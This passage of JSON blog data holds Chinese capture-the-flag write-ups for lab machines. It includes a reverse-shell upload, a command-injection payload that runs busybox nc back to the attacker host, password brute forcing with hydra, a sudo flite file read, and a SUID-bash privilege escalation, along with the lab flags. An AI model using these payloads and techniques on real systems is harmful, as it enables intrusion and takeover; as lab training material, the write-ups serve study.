\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u53ef\u7591\u7684\u5907\u4efd\u6587\u4ef6 `back.zip`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64\n...\n/uploads              (Status: 301) [Size: 320] [--> http://192.168.205.132/uploads/]\n/upload.php           (Status: 302) [Size: 0] [--> index.php]\n/back.zip             (Status: 200) [Size: 911]\n/index.php            (Status: 200) [Size: 14529]\n...\n```\n\n\u4e0b\u8f7d\u5e76\u89e3\u538b `back.zip` \u6587\u4ef6\uff0c\u83b7\u53d6\u5230\u7f51\u7ad9\u7684\u6e90\u7801 `upload.php` \u548c `index.php`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ wget http://192.168.205.132/back.zip\n...\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ unzip back.zip \nArchive:  back.zip\n  inflating: upload.php              \n  inflating: index.php\n```\n\n# **\u4e8c\u3001Web\u6e17\u900f\u4e0e\u7acb\u8db3\u70b9**\n\n## **1. \u6f0f\u6d1e\u5206\u6790**\n\n\u901a\u8fc7\u5ba1\u8ba1 `upload.php` \u7684\u6e90\u4ee3\u7801\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u5176\u6838\u5fc3\u5904\u7406\u903b\u8f91\uff1a\n\n```php\n<?php\n$upload_dir = '/var/www/webdav/uploads/';\n$filename = $_FILES['file']['name'];\n$tmp_name = $_FILES['file']['tmp_name'];\n\nif (!empty($filename)) {\n    // \u751f\u6210MD5\u6587\u4ef6\u540d\uff08\u4fdd\u7559\u539f\u6269\u5c55\u540d\uff09\n    $file_ext = pathinfo($filename, PATHINFO_EXTENSION);\n    $new_name = md5(pathinfo($filename, PATHINFO_FILENAME)) . ($file_ext ? '.$file_ext' : '');\n    \n    // \u79fb\u52a8\u6587\u4ef6\u5230\u4e0a\u4f20\u76ee\u5f55\n    if (move_uploaded_file($tmp_name, $upload_dir . $new_name)) {\n        echo 'Upload ok';\n    } else {\n        echo '\u6587\u4ef6\u4e0a\u4f20\u5931\u8d25\uff01';\n    }\n} else {\n    header('Location: index.php');\n}\n?>\n```\n\n\u4ee3\u7801\u903b\u8f91\u5b58\u5728\u660e\u663e\u7684\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002\u5b83\u5c06\u4e0a\u4f20\u6587\u4ef6\u7684\u6587\u4ef6\u540d\uff08\u4e0d\u542b\u6269\u5c55\u540d\uff09\u8fdb\u884cMD5\u54c8\u5e0c\uff0c\u7136\u540e\u62fc\u63a5\u4e0a\u539f\u59cb\u6269\u5c55\u540d\uff0c\u5b58\u50a8\u5230 `/var/www/webdav/uploads/` \u76ee\u5f55\u4e0b\u3002\u7531\u4e8e\u6ca1\u6709\u5bf9\u6587\u4ef6\u7c7b\u578b\u6216\u5185\u5bb9\u505a\u4efb\u4f55\u68c0\u67e5\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2aPHP\u53cd\u5f39Shell\u3002\n\n## **2. Getshell**\n\n**\u5229\u7528\u6b65\u9aa4:**\n\n1. \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `reverse.php` \u7684\u53cd\u5f39Shell\u6587\u4ef6\u3002\n\n2. \u8ba1\u7b97\u6587\u4ef6\u540d 'reverse' \u7684MD5\u503c\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n   \u2514\u2500$ echo -n 'reverse' |md5sum                           \n   4d9c2073afa3c2abb817dceb22c34de6  -\n   ```\n\n   \u4e0a\u4f20\u540e\u7684\u6587\u4ef6\u5c06\u88ab\u547d\u540d\u4e3a `4d9c2073afa3c2abb817dceb22c34de6.php`\u3002\n\n3. \u5728\u653b\u51fb\u673a\uff08Kali\uff09\u4e0a\u5f00\u542f `netcat` \u76d1\u542c `4444` \u7aef\u53e3\u3002\n\n4. \u901a\u8fc7Web\u9875\u9762\u4e0a\u4f20 `reverse.php` \u6587\u4ef6\u3002\n\n5. \u5728\u6d4f\u89c8\u5668\u6216\u4f7f\u7528 `curl` \u8bbf\u95ee `http://192.168.205.132/uploads/4d9c2073afa3c2abb817dceb22c34de6.php`\u3002\n\n6. \u653b\u51fb\u673a\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\uff0c\u83b7\u5f97 `www-data` \u7528\u6237\u6743\u9650\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. \u6a2a\u5411\u79fb\u52a8 (www-data -> lemon)**\n\n\u5728 `www-data` \u7684Shell\u4e2d\uff0c\u6211\u4eec\u68c0\u67e5 `/home` \u76ee\u5f55\uff0c\u53d1\u73b0\u4e86 `lemon` \u548c `welcome` \u4e24\u4e2a\u7528\u6237\u3002\u901a\u8fc7\u7ffb\u9605 `lemon` \u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u7684 `.bash_history` \u6587\u4ef6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u6761\u53ef\u7591\u8bb0\u5f55\u3002\n\n```bash\nwww-data@Rrrdesk:/home/lemon$ cat .bash_history\n...\necho speaker | md5sum\n...\n```\n\n\u8fd9\u5f3a\u70c8\u6697\u793a\u7528\u6237 `lemon` \u7684\u5bc6\u7801\u53ef\u80fd\u662f `speaker`\u3002\n\n\u6211\u5148\u5c1d\u8bd5\u4e86su\u5207\u6362\u7528\u6237\uff0c\u4f46\u662f\u8be5\u7cfb\u7edf\u6ca1\u6709su\uff0c\u7136\u540e\u5c1d\u8bd5\u4f7f\u7528SSH\u8fde\u63a5\uff0c\u867d\u7136 `nmap` \u626b\u63cf\u663e\u793aSSH\u670d\u52a1\u5f00\u653e\uff0c\u4f46\u5c1d\u8bd5\u4f7f\u7528 `lemon:speaker` \u767b\u5f55SSH\u5931\u8d25\uff0c\u6709\u70b9\u6000\u7591\u662fSSH\u914d\u7f6e\u9650\u5236\u4e86\u8be5\u7528\u6237\u7684\u767b\u5f55\uff08\u524d\u6bb5\u65f6\u95f4\uff0c\u7fa4\u4e3b\u804a\u8fc7\u76f8\u5173\u7684\u8bdd\u9898\uff0c\u6211\u770b\u4e86\u51e0\u773c\u3002\u7ecf\u8fc7\u9a8c\u8bc1\uff0c\u786e\u5b9e\u662fssh\u7684\u914d\u7f6e\u6587\u4ef6\u9650\u5236\u4e86`welcome`\u3001`lemon`\u7528\u6237\u7684\u767b\u5f55\uff09\u3002\n\n\u7136\u800c\uff0c\u7aef\u53e3\u626b\u63cf\u4e5f\u53d1\u73b0\u4e86\u5f00\u653e\u7684 **3389 (RDP)** \u7aef\u53e3\u3002\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u8be5\u51ed\u636e\u8fdb\u884cRDP\u8fde\u63a5\u3002\n\n*ps:\u8fd9\u91cc\u6211\u6253\u7684\u8def\u7ebf\u4e0d\u662f3389\uff0c\u6211\u662f\u76f4\u63a5\u5728\u9776\u673a\u767b\u5f55\u4e86\uff0c\u4f46\u662f\u8fd9\u4e2a\u601d\u8def\u662f\u72af\u89c4\u7684\ud83d\ude00\u3002*\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ rdesktop -u lemon 192.168.205.132\n```\n\n\u6210\u529f\u767b\u5f55\u5230 `lemon` \u7528\u6237\u7684\u684c\u9762\u73af\u5883\u3002\u6211\u4eec\u5728\u6b64\u73af\u5883\u4e0b\u53cd\u5f39\u4e00\u4e2a\u65b0\u7684Shell\u5230\u653b\u51fb\u673a\uff0c\u4ee5\u4fbf\u540e\u7eed\u64cd\u4f5c\uff0c\u5e76\u6210\u529f\u8bfb\u53d6\u5230\u7b2c\u4e00\u4e2aFlag\u3002\n\n```bash\nlemon@Rrrdesk:~$ cat user.txt \nflag{user-9ffbf43126e33be52cd2bf7e01d627f9}\n```\n\n## **2. \u63d0\u6743\u81f3root (lemon -> root)**\n\n\u5728 `lemon` \u7528\u6237\u7684Shell\u4e2d\uff0c\u6267\u884c `sudo -l` \u6765\u68c0\u67e5\u5176 `sudo` \u6743\u9650\u3002\n\n```bash\nlemon@Rrrdesk:~$ sudo -l\n...\nUser lemon may run the following commands on Rrrdesk:\n    (ALL) NOPASSWD: /usr/bin/flite\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c`lemon` \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c `/usr/bin/flite`\u3002`flite` \u662f\u4e00\u4e2a\u6587\u672c\u5230\u8bed\u97f3\u7684\u5408\u6210\u5668\u3002\u901a\u8fc7\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0 `flite` \u7684 `-add_lex` \u53c2\u6570\u53ef\u4ee5\u88ab\u7528\u6765\u8bfb\u53d6\u6587\u4ef6\u3002\u5f53\u5b83\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u4e2a\u975e\u6807\u51c6\u683c\u5f0f\u7684\u8bcd\u5178\u6587\u4ef6\u65f6\uff0c\u4f1a\u62a5\u9519\u5e76\u663e\u793a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\n\n\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u7279\u6027\u6765\u8bfb\u53d6 `/root` \u76ee\u5f55\u4e0b\u7684 `root.txt` \u6587\u4ef6\u3002\n\n```bash\nlemon@Rrrdesk:~$ sudo /usr/bin/flite -add_lex /root/root.txt\nadd_addenda: lex cmu: expected ':' in flag{root-68b329da9893e34099c7d8ad5cb9c940}\n```\n\n\u547d\u4ee4\u7684\u62a5\u9519\u4fe1\u606f\u6210\u529f\u6cc4\u9732\u4e86 `root.txt` \u7684\u5185\u5bb9\u3002\n\n# **\u56db\u3001\u83b7\u53d6Flag**\n\n\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u83b7\u53d6\u4e86\u7cfb\u7edf\u4e0a\u7684\u6240\u6709Flag\u3002\n\n* **User Flag:**\n\n  ```bash\n  lemon@Rrrdesk:~$ cat /home/lemon/user.txt\n  flag{user-9ffbf43126e33be52cd2bf7e01d627f9}\n  ```\n\n* **Root Flag:**\n\n  ```\n  flag{root-68b329da9893e34099c7d8ad5cb9c940}\n  ```\n\n\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754921518, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-11", "dateLabelColor": "#0969da"}, "P207": {"htmlDir": "docs/post/nei-bu-_Stitch.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Stitch", "postUrl": "post/nei-bu-_Stitch.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/207", "commentNum": 0, "wordCount": 5948, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u5bf9\u672c\u5730\u7f51\u6bb5 `192.168.205.0/24` \u8fdb\u884c\u626b\u63cf\uff0c\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 08:00:27:41:c8:f0       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u8ba4\u76ee\u6807IP\u5730\u5740\u4e3a `192.168.205.131`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.131\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u7aef\u53e3\u3002\n\n## 3. \u5b50\u57df\u540d\u679a\u4e3e\n\n\u8bbf\u95ee `http://192.168.205.131`\uff0c\u5728\u9875\u9762\u9875\u811a\u53d1\u73b0\u4e00\u4e2a\u8054\u7cfb\u90ae\u7bb1 `support@stitch.dsz`\u3002\u7531\u6b64\u63a8\u65ad\u51fa\u4e3b\u57df\u540d\u4e3a `stitch.dsz`\u3002\n\n\u6211\u4eec\u5c06IP\u4e0e\u4e3b\u57df\u540d\u7ed1\u5b9a\u5728\u672c\u5730 `/etc/hosts` \u6587\u4ef6\u4e2d\u3002\n\n```bash\n192.168.205.131 stitch.dsz\n```\n\n\u968f\u540e\uff0c\u4f7f\u7528 `wfuzz` \u5bf9\u4e3b\u57df\u540d\u8fdb\u884c\u865a\u62df\u4e3b\u673a\uff08VHost\uff09\u7206\u7834\uff0c\u53d1\u73b0\u4e86\u591a\u4e2a\u5b50\u57df\u540d\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ wfuzz -c -u 'http://stitch.dsz' -H 'HOST:FUZZ.stitch.dsz' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 1348\n...\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n000000002:   200        60 L     163 W      1822 Ch     'mail - mail'\n000004858:   200        61 L     132 W      1751 Ch     'dog - dog'\n000049948:   200        225 L    549 W      7295 Ch     'iot - iot'\n...\n```\n\n\u53d1\u73b0 `mail.stitch.dsz`, `dog.stitch.dsz`, \u548c `iot.stitch.dsz` \u4e09\u4e2a\u5b50\u57df\u540d\u3002\u5c06\u5b83\u4eec\u5168\u90e8\u6dfb\u52a0\u5230 `/etc/hosts` \u6587\u4ef6\u4e2d\u4ee5\u65b9\u4fbf\u540e\u7eed\u8bbf\u95ee\u3002\n\n## 4. Web\u5e94\u7528\u5206\u6790\n\n\u7ecf\u8fc7\u5bf9\u6bcf\u4e2a\u5df2\u53d1\u73b0\u5b50\u57df\u7684\u76ee\u5f55\u679a\u4e3e\u548c\u521d\u6b65\u6d4b\u8bd5\uff0c\u6211\u4eec\u5c06\u5176\u5173\u952e\u7279\u5f81\u548c\u6f5c\u5728\u653b\u51fb\u9762\u603b\u7ed3\u5982\u4e0b\uff1a\n\n*   **dog.stitch.dsz**: \u4e00\u4e2a\u56fe\u7247\u4e0a\u4f20\u9875\u9762\u3002\u901a\u8fc7\u76ee\u5f55\u7206\u7834\u53d1\u73b0 `/backup.zip`\uff0c\u6e90\u7801\u5206\u6790\u8868\u660e\u5176\u5b58\u5728\u4e25\u683c\u7684MIME\u7c7b\u578b\u6821\u9a8c\u548c\u56fe\u50cf\u4e8c\u6b21\u6e32\u67d3\uff0c\u96be\u4ee5\u76f4\u63a5\u5229\u7528\u4e0a\u4f20\u6f0f\u6d1e\u3002\n*   **mail.stitch.dsz**: \u4e00\u4e2a\u9759\u6001\u90ae\u4ef6\u9875\u9762\u3002\u76ee\u5f55\u7206\u7834\u53d1\u73b0 `mail.php`\uff0c\u8bbf\u95ee\u540e\u53d1\u73b0\u8be5\u9875\u9762\u786c\u7f16\u7801\u4e86\u5bf9 `/etc/passwd` \u6587\u4ef6\u7684\u8bfb\u53d6\uff0c\u5bfc\u81f4\u4e86\u7cfb\u7edf\u7528\u6237\u540d\u5217\u8868\u7684\u6cc4\u9732\u3002\u8fd9\u5e76\u975e\u901a\u7528\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u4f46\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u5173\u952e\u7684\u679a\u4e3e\u4fe1\u606f\u3002\n*   **iot.stitch.dsz**: \u4e00\u4e2a\u7269\u8054\u7f51\uff08IoT\uff09\u8bbe\u5907\u767b\u5f55\u9762\u677f\u3002\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u6b64\u5904\u7684\u767b\u5f55\u8868\u5355\u5b58\u5728**\u547d\u4ee4\u6ce8\u5165**\u6f0f\u6d1e\uff0c\u662f\u6211\u4eec\u7684\u4e3b\u8981\u7a81\u7834\u53e3\u3002\n\n# \u4e8c\u3001\u7acb\u8db3\u70b9\n\n## 1. \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\n\n`iot.stitch.dsz` \u7684\u767b\u5f55\u9875\u9762\u540e\u7aef\u5904\u7406\u7528\u6237\u8f93\u5165\u65f6\u672a\u505a\u4e25\u683c\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u5728 `username` \u53c2\u6570\u4e2d\u53ef\u4ee5\u6ce8\u5165\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3002\n\n## 2. \u83b7\u53d6\u53cd\u5411Shell\n\n\u6211\u4eec\u5229\u7528\u8be5\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u8ba9\u76ee\u6807\u4e3b\u673a\u6267\u884c\u4e00\u6761\u53cd\u5f39shell\u7684\u547d\u4ee4\u3002\n\n* **\u6b65\u9aa4\u4e00\uff1a\u5728Kali\u653b\u51fb\u673a\u4e0a\u76d1\u542c\u7aef\u53e3**\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n  \u2514\u2500$ nc -lvnp 8888\n  ```\n\n* **\u6b65\u9aa4\u4e8c\uff1a\u6784\u9020\u5e76\u53d1\u9001Payload**\n  \u5728 `iot` \u767b\u5f55\u9875\u9762\u7684 `username` \u8f93\u5165\u6846\u4e2d\u586b\u5165\u4ee5\u4e0b\u7ecf\u8fc7URL\u7f16\u7801\u7684Payload\uff0c\u5bc6\u7801\u4efb\u610f\u586b\u5199\u540e\u63d0\u4ea4\u3002\n\n  ```\n  ;busybox nc 192.168.205.128 8888 -e $(which $(echo $0));\n  ```\n\n* **\u6b65\u9aa4\u4e09\uff1a\u6210\u529f\u63a5\u6536Shell**\n  Kali\u7684\u76d1\u542c\u7aef\u53e3\u6210\u529f\u63a5\u6536\u5230\u6765\u81ea\u76ee\u6807\u670d\u52a1\u5668\u7684\u53cd\u5411shell\uff0c\u5f53\u524d\u7528\u6237\u4e3a `www-data`\u3002\n\n  ```bash\n  listening on [any] 8888 ...\n  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 60340\n  id\n  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  ```\n\n* **\u6b65\u9aa4\u56db\uff1a\u7a33\u5b9aShell**\n\n  ```bash\n  script /dev/null -c bash\n  Ctrl+Z\n  stty raw -echo; fg\n  reset xterm\n  export TERM=xterm\n  export SHELL=/bin/bash\n  stty rows 24 columns 80\n  ```\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u6a2a\u5411\u79fb\u52a8 (www-data -> iiiii)\n\n\u5728 `www-data` \u7528\u6237\u7684shell\u4e2d\uff0c\u6211\u4eec\u5bf9Web\u76ee\u5f55\u8fdb\u884c\u63a2\u67e5\uff0c\u5728 `dog` \u5b50\u7ad9\u70b9\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u53d1\u73b0\u5173\u952e\u4fe1\u606f\u3002\n\n```bash\nwww-data@Stitch:/var/www/dog$ cat config.php\n<?php\n/*\n * IoT System Configuration File\n * Security Key: iiiii:3c4900896d92da\n * Last Updated: 2023-10-15\n */\n// ... (\u5176\u4ed6\u914d\u7f6e)\n?>\n```\n\n`config.php` \u6587\u4ef6\u6cc4\u9732\u4e86\u4e00\u4e2a\u683c\u5f0f\u4e3a `username:password` \u7684\u5b89\u5168\u5bc6\u94a5\uff1a`iiiii:3c4900896d92da`\u3002\n\n\u4f7f\u7528\u6b64\u51ed\u636e\uff0c\u6211\u4eec\u6210\u529f\u4ece `www-data` \u5207\u6362\u5230 `iiiii` \u7528\u6237\uff0c\u5e76\u83b7\u53d6\u4e86\u7b2c\u4e00\u4e2aflag\u3002\n\n```bash\nwww-data@Stitch:/var/www/dog$ su iiiii\nPassword: 3c4900896d92da\niiiii@Stitch:/var/www/dog$ id\nuid=1000(iiiii) gid=1000(iiiii) groups=1000(iiiii)\niiiii@Stitch:~$ cat /home/iiiii/user.txt\nflag{user-265620fc-3eda-11f0-b71d-000c2955ba04}\n```\n\n## 2. \u63d0\u6743\u81f3Root (iiiii -> iotuser -> root)\n\n\u8fd9\u662f\u4e00\u4e2a\u591a\u6b65\u9aa4\u7684\u63d0\u6743\u8fc7\u7a0b\uff0c\u9700\u8981\u7ed3\u5408\u4e24\u4e2a\u7528\u6237\u7684\u6743\u9650\u548c\u7cfb\u7edf\u914d\u7f6e\u624d\u80fd\u5b8c\u6210\u3002\n\n* **\u6b65\u9aa4\u4e00\uff1a\u6743\u9650\u5206\u6790 (iiiii)**\n  \u5728 `iiiii` \u7528\u6237\u4e0b\uff0c\u4f7f\u7528 `sudo -l` \u53d1\u73b0\u5176\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c `/usr/bin/push_iot`\u3002\u901a\u8fc7 `strings` \u5206\u6790\u8be5\u7a0b\u5e8f\uff0c\u5f97\u77e5\u5176\u529f\u80fd\u662f\u5c06\u4e00\u4e2a\u6587\u4ef6\u590d\u5236\u5230 `/var/iot_scripts/` \u76ee\u5f55\uff0c\u4f46\u8981\u6c42\u6e90\u6587\u4ef6\u6240\u6709\u8005\u5fc5\u987b\u662f `iotuser`\uff0c\u4e14\u6743\u9650\u4e3a `600`\uff0c\u62d2\u7edd\u8f6f\u94fe\u3002\u8fd9\u4e2a\u9650\u5236\u6761\u4ef6\u8feb\u4f7f\u6211\u4eec\u5fc5\u987b\u5148\u83b7\u5f97 `iotuser` \u7684\u63a7\u5236\u6743\u3002\n\n* **\u6b65\u9aa4\u4e8c\uff1a\u6a2a\u5411\u79fb\u52a8 (iiiii -> iotuser)**\n  \u6211\u4eec\u56de\u5230\u4e4b\u524d\u53d1\u73b0\u7684 `/var/www/dog/config.php` \u6587\u4ef6\uff0c\u6536\u96c6\u5176\u4e2d\u6240\u6709\u770b\u8d77\u6765\u50cf\u5bc6\u7801\u7684\u786c\u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u521b\u5efa\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5bc6\u7801\u5b57\u5178\u3002\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n  \u2514\u2500$ cat pass\n  3c4900896d92da\n  s3cur3P@ssw0rd!\n  3c4900896d92da789abc\n  sk_live_xyz123iiiii\n  d3v!c3P@ss\n  ```\n\n\u4f7f\u7528\u8fd9\u4e2a\u5b57\u5178\u548c `hydra` \u5de5\u5177\uff0c\u5bf9 `iotuser` \u7684SSH\u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ hydra -l iotuser -P pass ssh://192.168.205.131 -f -I -u -e nsr -t 64\n...\n[22][ssh] host: 192.168.205.131   login: iotuser   password: 3c4900896d92da\n...\n```\n\n\u6210\u529f\u7834\u89e3\u51fa `iotuser` \u7684\u5bc6\u7801\u4e5f\u662f `3c4900896d92da`\u3002\u4f7f\u7528\u6b64\u5bc6\u7801\u901a\u8fc7SSH\u6210\u529f\u767b\u5f55\u3002\n\n* **\u6b65\u9aa4\u4e09\uff1a\u63d0\u6743\u8def\u5f84\u53d1\u73b0 (iotuser)**\n  \u767b\u5f55 `iotuser` \u540e\uff0c\u518d\u6b21\u6267\u884c `sudo -l`\uff0c\u53d1\u73b0\u65b0\u7ebf\u7d22\uff1a\n\n  ```bash\n  iotuser@Stitch:~$ sudo -l\n  ...\n  User iotuser may run the following commands on Stitch:\n      (ALL) NOPASSWD: /usr/bin/iot_runner\n  ```\n\n  `iotuser` \u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c `/usr/bin/iot_runner`\uff0c\u8be5\u811a\u672c\u4f1a\u6267\u884c\u4f4d\u4e8e `/var/iot_scripts/` \u76ee\u5f55\u4e0b\u7684\u6307\u5b9a\u811a\u672c\u3002\u81f3\u6b64\uff0c\u5b8c\u6574\u7684\u63d0\u6743\u94fe\u5df2\u7ecf\u6e05\u6670\uff1a\n\n  1.  \u4ee5 `iotuser` \u8eab\u4efd\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u63d0\u6743\u4ee3\u7801\u7684\u6076\u610f\u811a\u672c\u3002\n  2.  \u4ee5 `iiiii` \u8eab\u4efd\u4f7f\u7528 `push_iot` \u5c06\u6b64\u6076\u610f\u811a\u672c\u590d\u5236\u5230 `/var/iot_scripts/`\u3002\n  3.  \u6700\u540e\u4ee5 `iotuser` \u8eab\u4efd\u4f7f\u7528 `iot_runner` \u6267\u884c\u8be5\u811a\u672c\uff0c\u5b8c\u6210\u63d0\u6743\u3002\n\n* **\u6b65\u9aa4\u56db\uff1a\u6267\u884c\u63d0\u6743**\n\n  1. **\u4f5c\u4e3a `iotuser`**\uff0c\u5728\u5171\u4eab\u76ee\u5f55 `/dev/shm/` \u4e0b\u521b\u5efa\u63d0\u6743\u811a\u672c `a.sh`\uff0c\u5185\u5bb9\u4e3a\u7ed9 `bash` \u6dfb\u52a0SUID\u6743\u9650\uff0c\u5e76\u8bbe\u7f6e\u5176\u6743\u9650\u4e3a `600` \u4ee5\u6ee1\u8db3 `push_iot` \u7684\u68c0\u67e5\u6761\u4ef6\u3002\n\n     ```bash\n     iotuser@Stitch:~$ vim /dev/shm/a.sh\n     iotuser@Stitch:~$ cat /dev/shm/a.sh\n     IOT#\n     chmod +s /bin/bash\n     iotuser@Stitch:~$ chmod 600 /dev/shm/a.sh\n     ```\n\n  2. **\u5207\u6362\u56de `iiiii` \u7528\u6237**\uff0c\u6267\u884c `push_iot` \u547d\u4ee4\u3002\n\n     ```bash\n     iiiii@Stitch:/tmp$ sudo /usr/bin/push_iot /dev/shm/a.sh\n     All checks passed. Copying file...\n     File successfully copied to /var/iot_scripts/a.sh\n     ```\n\n  3. **\u518d\u6b21\u5207\u6362\u56de `iotuser`**\uff0c\u6267\u884c `iot_runner` \u89e6\u53d1payload\u3002\n\n     ```bash\n     iotuser@Stitch:~$ sudo /usr/bin/iot_runner a.sh\n     Checking script: /var/iot_scripts/a.sh\n     Verification passed.:\n     ```\n\n  4. \u68c0\u67e5 `/bin/bash` \u6743\u9650\uff0c\u53d1\u73b0\u5df2\u6210\u529f\u8bbe\u7f6eSUID\u4f4d\u3002\u6267\u884c `bash -p` \u83b7\u5f97root\u6743\u9650\u3002\n\n     ```bash\n     iotuser@Stitch:~$ ls -al /bin/bash\n     -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n     iotuser@Stitch:~$ bash -p\n     bash-5.0# id\n     uid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)\n     ```\n\n# \u56db\u3001\u83b7\u53d6Flag\n\n```bash\nbash-5.0# id\nuid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)\nbash-5.0# cat /root/root.txt /home/iiiii/user.txt \nflag{root-251f332a-3ed6-11f0-960d-000c2955ba04}\nflag{user-265620fc-3eda-11f0-b71d-000c2955ba04}\n```\n\n\u81f3\u6b64\uff0c\u6240\u6709Flag\u5747\u5df2\u627e\u5230\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754964294, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-12", "dateLabelColor": "#0969da"}, "P208": {"htmlDir": "docs/post/nei-bu-_Pane1.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Pane1", "postUrl": "post/nei-bu-_Pane1.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/208", "commentNum": 0, "wordCount": 3957, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l                           \n...\n192.168.205.132 08:00:27:e2:db:af       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u8ba4\u76ee\u6807\u4e3b\u673aIP\u5730\u5740\u4e3a `192.168.205.132`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `nmap` 